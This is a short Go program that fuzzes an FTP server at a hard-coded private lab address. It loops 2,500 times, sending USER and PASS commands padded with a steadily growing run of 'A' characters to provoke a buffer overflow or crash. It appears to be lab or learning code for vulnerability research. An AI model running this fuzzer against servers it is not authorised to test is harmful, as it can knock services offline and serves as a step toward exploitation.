package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
)

func main() {
	for i := range 2500 {
		conn, err := net.Dial("tcp", "172.16.21.129:21")
		if err != nil {
			log.Panic(err, " test")
		}

		bufio.NewReader(conn).ReadString('\n')
		user := ""
		for n := 0; n <= i; n++ {
			user += "A"
		}

		fmt.Fprintf(conn, "USER %s\n", user)
		bufio.NewReader(conn).ReadString('\n')

		fmt.Fprintf(conn, "PASS %s\n", user)
		bufio.NewReader(conn).ReadString('\n')
		fmt.Println("asdf")
		if err := conn.Close(); err != nil {
			log.Println(err)
		}
	}
}
